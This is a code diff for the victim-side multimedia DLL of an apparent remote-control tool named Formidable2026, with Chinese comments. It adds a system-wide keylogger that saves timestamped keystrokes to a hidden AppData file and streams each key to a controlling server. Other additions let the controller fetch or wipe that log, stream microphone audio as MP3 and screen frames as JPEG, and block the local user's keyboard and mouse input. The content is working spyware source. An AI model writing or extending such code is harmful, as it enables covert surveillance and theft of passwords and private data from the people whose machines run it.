@@ -1,6 +1,7 @@
 ﻿/**
- * Formidable2026 - Multimedia Module (Skeleton DLL)
- * Handles: Audio, Video, Keylogger
+ * Formidable2026 - Multimedia Module (被控端DLL)
+ * 运行在被控端（Client），处理音频、视频、键盘记录
+ * 数据通过socket发送回主控端（Master）
  */
 #ifndef WIN32_LEAN_AND_MEAN
 #define WIN32_LEAN_AND_MEAN
@@ -12,15 +13,29 @@
 #include <vector>
 #include <string>
 #include <thread>
+#include <shlobj.h>
+#include <gdiplus.h>
 #include "../../Common/Config.h"
-#include "../../Common/Module.h"
 
+// TurboJPEG 高性能 JPEG 压缩支持
+#ifdef USE_TURBOJPEG
+#include <turbojpeg.h>
+#endif
+
+// LAME MP3 编码支持
+#ifdef USE_LAME
+#include <lame.h>
+#endif
+
+#pragma comment(lib, "gdiplus.lib")
 #pragma comment(lib, "winmm.lib")
+#pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "gdi32.lib")
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "vfw32.lib")
 
 using namespace Formidable;
+using namespace Gdiplus;
 
 // 全局变量
 SOCKET g_socket = INVALID_SOCKET;
@@ -28,19 +43,80 @@ HWAVEIN g_hWaveIn = NULL;
 WAVEHDR g_WaveHdr[2];
 char g_WaveBuffer[2][8192];
 
-// 键盘记录变量
+ULONG_PTR g_gdiplusToken;
+int g_compressType = 0; // 0=RAW(BMP), 1=JPEG(GDI+), 2=JPEG(TurboJPEG)
+
+#ifdef USE_TURBOJPEG
+tjhandle g_tjCompressor = NULL;
+#endif
+
+#ifdef USE_LAME
+lame_t g_lameEncoder = NULL;
+#endif
+
+// 键盘记录相关
 HHOOK g_hKeyHook = NULL;
 std::string g_keyData;
+FILE* g_keylogFile = NULL;
+bool g_offlineMode = false; // 离线记录模式
+bool g_offlineRecordEnabled = true; // 离线记录开关（默认启用）
+std::string g_keylogFilePath;
+
+// 获取键盘记录文件路径
+std::string GetKeylogFilePath() {
+    char szPath[MAX_PATH];
+    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, szPath) == S_OK) {
+        std::string path = szPath;
+        path += "\\Formidable2026";
+        CreateDirectoryA(path.c_str(), NULL);
+        path += "\\keylog.dat";
+        return path;
+    }
+    return "keylog.dat";
+}
+
+// 写入按键到文件
+void WriteKeyToFile(const char* key, int len) {
+    // 检查离线记录开关
+    if (!g_offlineRecordEnabled) {
+        return;
+    }
+    
+    if (!g_keylogFile) {
+        g_keylogFilePath = GetKeylogFilePath();
+        g_keylogFile = fopen(g_keylogFilePath.c_str(), "ab"); // 追加模式
+    }
+    if (g_keylogFile) {
+        // 添加时间戳
+        SYSTEMTIME st;
+        GetLocalTime(&st);
+        char timestamp[64];
+        sprintf(timestamp, "[%04d-%02d-%02d %02d:%02d:%02d] ",
+            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
+        fwrite(timestamp, 1, strlen(timestamp), g_keylogFile);
+        fwrite(key, 1, len, g_keylogFile);
+        fflush(g_keylogFile); // 立即写入磁盘
+    }
+}
 
 // 屏幕监控相关
 bool g_screenRunning = false;
 std::thread g_screenThread;
+int g_screenFPS = 10;
+int g_screenQuality = 0; // 0=1080p限制, 1=原始分辨率
+bool g_inputLocked = false;
 
 // 视频监控相关
 bool g_videoRunning = false;
 HWND g_hCap = NULL;
 std::thread g_videoThread;
 
+// 屏幕优化相关全局变量（预留用于未来优化）
+// bool g_useGrayscale = false; // 是否使用灰度模式
+// bool g_useBlockDiff = true;  // 是否使用分块差异检测
+// int g_blockSize = 64;        // 差异检测块大小（像素）
+
+// 发送响应数据到主控端（Master）
 void SendResponse(SOCKET s, uint32_t cmd, const void* data, int len) {
     PkgHeader header;
     memcpy(header.flag, "FRMD26?", 7);
@@ -65,7 +141,31 @@ void CALLBACK waveInProc(HWAVEIN hwi, UINT uMsg, DWORD_PTR dwInstance, DWORD_PTR
     if (uMsg == WIM_DATA) {
         PWAVEHDR pwh = (PWAVEHDR)dwParam1;
         if (pwh->dwBytesRecorded > 0) {
-            SendResponse(g_socket, CMD_VOICE_STREAM, pwh->lpData, pwh->dwBytesRecorded);
+#ifdef USE_LAME
+            if (g_lameEncoder) {
+                // 使用 LAME 进行 MP3 编码
+                int numSamples = pwh->dwBytesRecorded / 2; // 16-bit PCM，每个样本2字节
+                int mp3BufSize = (int)(1.25 * numSamples + 7200); // LAME 推荐的缓冲区大小
+                std::vector<unsigned char> mp3Buf(mp3BufSize);
+                
+                int mp3Size = lame_encode_buffer(
+                    g_lameEncoder,
+                    (short*)pwh->lpData,    // PCM 数据
+                    NULL,                    // 单声道，右声道为 NULL
+                    numSamples,
+                    mp3Buf.data(),
+                    mp3BufSize
+                );
+                
+                if (mp3Size > 0) {
+                    SendResponse(g_socket, CMD_VOICE_STREAM, mp3Buf.data(), mp3Size);
+                }
+            } else
+#endif
+            {
+                // 发送原始 PCM 数据（备用）
+                SendResponse(g_socket, CMD_VOICE_STREAM, pwh->lpData, pwh->dwBytesRecorded);
+            }
         }
         waveInAddBuffer(hwi, pwh, sizeof(WAVEHDR));
     }
@@ -73,6 +173,22 @@ void CALLBACK waveInProc(HWAVEIN hwi, UINT uMsg, DWORD_PTR dwInstance, DWORD_PTR
 
 void StartVoice(SOCKET s) {
     g_socket = s;
+
+#ifdef USE_LAME
+    // 初始化 LAME 编码器
+    if (!g_lameEncoder) {
+        g_lameEncoder = lame_init();
+        if (g_lameEncoder) {
+            lame_set_num_channels(g_lameEncoder, 1);       // 单声道
+            lame_set_in_samplerate(g_lameEncoder, 8000);   // 输入采样率 8kHz
+            lame_set_brate(g_lameEncoder, 32);             // 比特率 32kbps（语音足够）
+            lame_set_mode(g_lameEncoder, MONO);            // 单声道模式
+            lame_set_quality(g_lameEncoder, 7);            // 质量等级 0-9，7 为快速编码
+            lame_init_params(g_lameEncoder);
+        }
+    }
+#endif
+
     WAVEFORMATEX wfx;
     wfx.wFormatTag = WAVE_FORMAT_PCM;
     wfx.nChannels = 1;
@@ -110,6 +226,14 @@ void StopVoice() {
         waveInClose(g_hWaveIn);
         g_hWaveIn = NULL;
     }
+
+#ifdef USE_LAME
+    // 释放 LAME 编码器
+    if (g_lameEncoder) {
+        lame_close(g_lameEncoder);
+        g_lameEncoder = NULL;
+    }
+#endif
 }
 
 // 键盘钩子回调
@@ -128,12 +252,16 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             strcpy(szKey, "[BACK]");
         }
         
+        // 实时发送每个按键并写入文件
         if (szKey[0] != 0) {
-            g_keyData += szKey;
-            // 每 100 字节发送一次
-            if (g_keyData.size() > 100) {
-                SendResponse(g_socket, CMD_KEYLOG, g_keyData.c_str(), (int)g_keyData.size());
-                g_keyData.clear();
+            int len = (int)strlen(szKey);
+            
+            // 写入离线记录文件
+            WriteKeyToFile(szKey, len);
+            
+            // 如果socket有效，实时发送
+            if (g_socket != INVALID_SOCKET) {
+                SendResponse(g_socket, CMD_KEYLOG, szKey, len);
             }
         }
     }
@@ -142,6 +270,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
 void StartKeylog(SOCKET s) {
     g_socket = s;
+    g_offlineMode = (s == INVALID_SOCKET);
     if (g_hKeyHook == NULL) {
         g_hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
     }
@@ -152,94 +281,206 @@ void StopKeylog() {
         UnhookWindowsHookEx(g_hKeyHook);
         g_hKeyHook = NULL;
     }
+    // 关闭文件句柄
+    if (g_keylogFile) {
+        fclose(g_keylogFile);
+        g_keylogFile = NULL;
+    }
 }
 
+// 读取离线记录并发送
+void SendOfflineKeylog(SOCKET s) {
+    std::string filepath = GetKeylogFilePath();
+    FILE* f = fopen(filepath.c_str(), "rb");
+    if (f) {
+        fseek(f, 0, SEEK_END);
+        long size = ftell(f);
+        fseek(f, 0, SEEK_SET);
+        
+        if (size > 0 && size < 10 * 1024 * 1024) { // 限制10MB
+            std::vector<char> buffer(size);
+            fread(buffer.data(), 1, size, f);
+            SendResponse(s, CMD_KEYLOG, buffer.data(), (int)size);
+        }
+        fclose(f);
+    }
+}
+
+// 清空离线记录
+void ClearOfflineKeylog() {
+    std::string filepath = GetKeylogFilePath();
+    DeleteFileA(filepath.c_str());
+}
+
+int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
+    UINT num = 0, size = 0;
+    GetImageEncodersSize(&num, &size);
+    if (size == 0) return -1;
+    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
+    if (pImageCodecInfo == NULL) return -1;
+    GetImageEncoders(num, size, pImageCodecInfo);
+    for (UINT j = 0; j < num; ++j) {
+        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
+            *pClsid = pImageCodecInfo[j].Clsid;
+            free(pImageCodecInfo);
+            return j;
+        }
+    }
+    free(pImageCodecInfo);
+    return -1;
+}
+
+// 被控端屏幕捕获线程：捕获屏幕并发送数据到主控端
 void ScreenThread(SOCKET s) {
     HDC hScreenDC = GetDC(NULL);
-    int width = GetSystemMetrics(SM_CXSCREEN);
-    int height = GetSystemMetrics(SM_CYSCREEN);
-    HDC hMemDC = CreateCompatibleDC(hScreenDC);
-    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
-    SelectObject(hMemDC, hBitmap);
+    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
+    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
     
-    // 缓存上一帧用于差异比较
-    std::vector<char> lastFrameData;
+    // 初始化 GDI+（作为备用）
+    GdiplusStartupInput gsi;
+    GdiplusStartup(&g_gdiplusToken, &gsi, NULL);
+    CLSID clsidJpeg;
+    GetEncoderClsid(L"image/jpeg", &clsidJpeg);
+
+#ifdef USE_TURBOJPEG
+    // 初始化 TurboJPEG 压缩器
+    if (!g_tjCompressor) {
+        g_tjCompressor = tjInitCompress();
+    }
+#endif
+
+    HDC hMemDC = CreateCompatibleDC(hScreenDC);
     
     while (g_screenRunning) {
-        // Capture
-        BitBlt(hMemDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
-        
-        // Convert to BMP format in memory
-        BITMAP bmp;
-        GetObject(hBitmap, sizeof(BITMAP), &bmp);
-        
-        BITMAPFILEHEADER bmfHeader;
-        BITMAPINFOHEADER bi;
-        
-        bi.biSize = sizeof(BITMAPINFOHEADER);
-        bi.biWidth = bmp.bmWidth;
-        bi.biHeight = bmp.bmHeight;
-        bi.biPlanes = 1;
-        // 使用 16位色 (RGB555) 降低带宽 (32->16, 减少50%)
-        bi.biBitCount = 16; 
-        bi.biCompression = BI_RGB;
-        bi.biSizeImage = 0;
-        bi.biXPelsPerMeter = 0;
-        bi.biYPelsPerMeter = 0;
-        bi.biClrUsed = 0;
-        bi.biClrImportant = 0;
+        int width = GetSystemMetrics(SM_CXSCREEN);
+        int height = GetSystemMetrics(SM_CYSCREEN);
+        int targetWidth = width;
+        int targetHeight = height;
 
-        // 计算 16位对齐后的大小
-        // 16 bit = 2 bytes. Width * 2, aligned to 4 bytes.
-        DWORD dwLineBytes = ((bmp.bmWidth * 16 + 31) / 32) * 4;
-        DWORD dwBmpSize = dwLineBytes * bmp.bmHeight;
-        
-        // 分配缓冲区
-        std::vector<char> currentFrameData(dwBmpSize);
-        
-        // 获取位图数据
-        GetDIBits(hScreenDC, hBitmap, 0, (UINT)bmp.bmHeight, currentFrameData.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);
-        
-        // 差异比较：如果数据未变，则不发送
-        bool changed = true;
-        if (!lastFrameData.empty() && lastFrameData.size() == currentFrameData.size()) {
-            if (memcmp(lastFrameData.data(), currentFrameData.data(), dwBmpSize) == 0) {
-                changed = false;
+        if (g_screenQuality == 0) { // 1080P限制
+            if (targetWidth > 1920) {
+                targetHeight = (int)(targetHeight * 1920.0 / targetWidth);
+                targetWidth = 1920;
             }
         }
+
+        HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, targetWidth, targetHeight);
+        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemDC, hBitmap);
         
-        if (changed) {
-            // 构建完整 BMP 文件包
-            DWORD totalSize = dwBmpSize + sizeof(BITMAPINFOHEADER) + sizeof(BITMAPFILEHEADER);
-            std::vector<char> pkgBuffer(totalSize);
-            char* lpbitmap = pkgBuffer.data();
-            
-            // Construct file header
-            bmfHeader.bfType = 0x4D42; // "BM"
-            bmfHeader.bfSize = totalSize;
-            bmfHeader.bfReserved1 = 0;
-            bmfHeader.bfReserved2 = 0;
-            bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
-            
-            // Copy headers
-            memcpy(lpbitmap, &bmfHeader, sizeof(BITMAPFILEHEADER));
-            memcpy(lpbitmap + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));
-            // Copy bits
-            memcpy(lpbitmap + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), currentFrameData.data(), dwBmpSize);
-            
-            // Send
-            SendResponse(s, CMD_SCREEN_CAPTURE, lpbitmap, totalSize);
-            
-            // 更新缓存
-            lastFrameData = currentFrameData;
+        if (targetWidth == width && targetHeight == height) {
+            BitBlt(hMemDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
+        } else {
+            SetStretchBltMode(hMemDC, HALFTONE);
+            StretchBlt(hMemDC, 0, 0, targetWidth, targetHeight, hScreenDC, 0, 0, width, height, SRCCOPY);
         }
         
-        Sleep(200); // 提高帧率到 5 FPS (如果有变化)
+#ifdef USE_TURBOJPEG
+        if ((g_compressType == 1 || g_compressType == 2) && g_tjCompressor) {
+            // 使用 TurboJPEG 高性能压缩
+            BITMAP bmp;
+            GetObject(hBitmap, sizeof(BITMAP), &bmp);
+            
+            BITMAPINFOHEADER bi = { 0 };
+            bi.biSize = sizeof(BITMAPINFOHEADER);
+            bi.biWidth = bmp.bmWidth;
+            bi.biHeight = -bmp.bmHeight; // 负值表示自顶向下（TurboJPEG需要）
+            bi.biPlanes = 1;
+            bi.biBitCount = 24;
+            bi.biCompression = BI_RGB;
+            
+            int rowSize = ((bmp.bmWidth * 3 + 3) & ~3);
+            std::vector<unsigned char> rgbData(rowSize * bmp.bmHeight);
+            
+            GetDIBits(hMemDC, hBitmap, 0, bmp.bmHeight, rgbData.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);
+            
+            unsigned char* jpegBuf = NULL;
+            unsigned long jpegSize = 0;
+            int quality = 60; // JPEG 质量 (1-100)
+            
+            if (tjCompress2(g_tjCompressor, rgbData.data(), 
+                           bmp.bmWidth, rowSize, bmp.bmHeight, 
+                           TJPF_BGR, &jpegBuf, &jpegSize, 
+                           TJSAMP_420, quality, TJFLAG_FASTDCT) == 0) {
+                SendResponse(s, CMD_SCREEN_CAPTURE, jpegBuf, (int)jpegSize);
+                tjFree(jpegBuf);
+            }
+        } else
+#endif
+        if (g_compressType == 1) { // GDI+ JPEG 压缩（备用）
+            Bitmap* pBitmap = new Bitmap(hBitmap, NULL);
+            IStream* pStream = NULL;
+            if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) == S_OK) {
+                EncoderParameters encoderParams;
+                encoderParams.Count = 1;
+                encoderParams.Parameter[0].Guid = EncoderQuality;
+                encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
+                encoderParams.Parameter[0].NumberOfValues = 1;
+                long quality = 60; // 默认 60 质量
+                encoderParams.Parameter[0].Value = &quality;
+
+                if (pBitmap->Save(pStream, &clsidJpeg, &encoderParams) == Ok) {
+                    HGLOBAL hGlobal = NULL;
+                    if (GetHGlobalFromStream(pStream, &hGlobal) == S_OK) {
+                        void* pData = GlobalLock(hGlobal);
+                        DWORD dwSize = (DWORD)GlobalSize(hGlobal);
+                        if (pData && dwSize > 0) {
+                            SendResponse(s, CMD_SCREEN_CAPTURE, pData, (int)dwSize);
+                        }
+                        GlobalUnlock(hGlobal);
+                    }
+                }
+                pStream->Release();
+            }
+            delete pBitmap;
+        } else { // RAW BMP
+            BITMAP bmp;
+            GetObject(hBitmap, sizeof(BITMAP), &bmp);
+            BITMAPINFOHEADER bi;
+            bi.biSize = sizeof(BITMAPINFOHEADER);
+            bi.biWidth = bmp.bmWidth;
+            bi.biHeight = bmp.bmHeight;
+            bi.biPlanes = 1;
+            bi.biBitCount = 24; 
+            bi.biCompression = BI_RGB;
+            bi.biSizeImage = 0;
+            bi.biXPelsPerMeter = 0;
+            bi.biYPelsPerMeter = 0;
+            bi.biClrUsed = 0;
+            bi.biClrImportant = 0;
+
+            int rowSize = ((bmp.bmWidth * 24 + 31) / 32) * 4;
+            DWORD dwSizeImage = rowSize * bmp.bmHeight;
+            std::vector<char> bmpData(sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwSizeImage);
+            
+            BITMAPFILEHEADER* pBFH = (BITMAPFILEHEADER*)bmpData.data();
+            pBFH->bfType = 0x4D42;
+            pBFH->bfSize = (DWORD)bmpData.size();
+            pBFH->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+            
+            memcpy(bmpData.data() + sizeof(BITMAPFILEHEADER), &bi, sizeof(bi));
+            GetDIBits(hMemDC, hBitmap, 0, bmp.bmHeight, bmpData.data() + pBFH->bfOffBits, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
+            
+            SendResponse(s, CMD_SCREEN_CAPTURE, bmpData.data(), (int)bmpData.size());
+        }
+
+        SelectObject(hMemDC, hOldBitmap);
+        DeleteObject(hBitmap);
+        
+        uint32_t delay = 1000 / (g_screenFPS > 0 ? g_screenFPS : 1);
+        std::this_thread::sleep_for(std::chrono::milliseconds(delay));
     }
     
-    DeleteObject(hBitmap);
     DeleteDC(hMemDC);
     ReleaseDC(NULL, hScreenDC);
+    GdiplusShutdown(g_gdiplusToken);
+
+#ifdef USE_TURBOJPEG
+    // 释放 TurboJPEG 压缩器
+    if (g_tjCompressor) {
+        tjDestroy(g_tjCompressor);
+        g_tjCompressor = NULL;
+    }
+#endif
 }
 
 void StartScreen(SOCKET s) {
@@ -483,6 +724,17 @@ extern "C" __declspec(dllexport) void WINAPI ModuleEntry(SOCKET s, CommandPkg* p
         } else if (pkg->arg1 == 2) { // 获取当前缓存的数据
             SendResponse(s, CMD_KEYLOG, g_keyData.c_str(), (int)g_keyData.size());
             g_keyData.clear();
+        } else if (pkg->arg1 == 3) { // 获取离线记录
+            SendOfflineKeylog(s);
+        } else if (pkg->arg1 == 4) { // 清空离线记录
+            ClearOfflineKeylog();
+        } else if (pkg->arg1 == 5) { // 控制离线记录开关
+            g_offlineRecordEnabled = (pkg->arg2 != 0);
+            // 如果禁用且文件已打开，关闭文件
+            if (!g_offlineRecordEnabled && g_keylogFile) {
+                fclose(g_keylogFile);
+                g_keylogFile = NULL;
+            }
         }
     } else if (pkg->cmd == CMD_SCREEN_CAPTURE) {
         if (pkg->arg1 == 1) { // Start
@@ -490,6 +742,35 @@ extern "C" __declspec(dllexport) void WINAPI ModuleEntry(SOCKET s, CommandPkg* p
         } else { // Stop
             StopScreen();
         }
+    } else if (pkg->cmd == CMD_SCREEN_FPS) {
+        g_screenFPS = pkg->arg1;
+        if (g_screenFPS < 1) g_screenFPS = 1;
+        if (g_screenFPS > 60) g_screenFPS = 60;
+        // 如果正在运行，重启以应用新FPS
+        if (g_screenRunning) {
+            StopScreen();
+            Sleep(100);
+            StartScreen(s);
+        }
+    } else if (pkg->cmd == CMD_SCREEN_QUALITY) {
+        switch (pkg->arg1) {
+        case 0: // 限制1080P
+            g_screenQuality = 0;
+            break;
+        case 1: // 原始分辨率
+            g_screenQuality = 1;
+            break;
+        case 4: // 锁定/解锁输入
+            g_inputLocked = !g_inputLocked;
+            if (g_inputLocked) {
+                BlockInput(TRUE);
+            } else {
+                BlockInput(FALSE);
+            }
+            break;
+        }
+    } else if (pkg->cmd == CMD_SCREEN_COMPRESS) {
+        g_compressType = pkg->arg1; // 0=RAW, 1=JPEG
     } else if (pkg->cmd == CMD_MOUSE_EVENT) {
         ProcessMouseEvent((RemoteMouseEvent*)pkg->data);
     } else if (pkg->cmd == CMD_KEY_EVENT) {
